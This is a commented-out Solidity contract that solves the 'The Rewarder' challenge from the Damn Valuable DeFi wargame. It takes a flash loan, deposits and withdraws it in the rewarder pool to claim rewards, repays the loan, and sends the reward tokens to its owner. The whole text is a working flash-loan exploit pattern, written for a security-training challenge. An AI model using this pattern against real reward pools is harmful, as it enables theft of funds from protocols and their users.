/*
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {TheRewarderPool, RewardToken} from "../../src/the-rewarder/TheRewarderPool.sol";
import "../../src/the-rewarder/FlashLoanerPool.sol";
import "../../src/DamnValuableToken.sol";

contract Attacker {
    FlashLoanerPool flashloan;
    TheRewarderPool pool;
    DamnValuableToken dvt;
    RewardToken reward;
    address internal owner;

    constructor(address _flashloan,address _pool,address _dvt,address _reward){
        flashloan = FlashLoanerPool(_flashloan);
        pool = TheRewarderPool(_pool);
        dvt = DamnValuableToken(_dvt);
        reward = RewardToken(_reward);
        owner = msg.sender;
    }

    function attack(uint256 amount) external {
        flashloan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external{
        require(msg.sender == address(flashloan)); // Added for security (Alex)
        require(tx.origin == owner); // Added for security (Alex)

        dvt.approve(address(pool), amount);
        // deposit liquidity token get reward token
        // NOTE: May need to call pool.distributeRewards();
        pool.deposit(amount);
        // withdraw liquidity token
        pool.withdraw(amount);
        // repay to flashloan
        dvt.transfer(address(flashloan), amount);
        uint256 rewardBalance = reward.balanceOf(address(this));
        reward.transfer(owner, rewardBalance);
    }
}
*/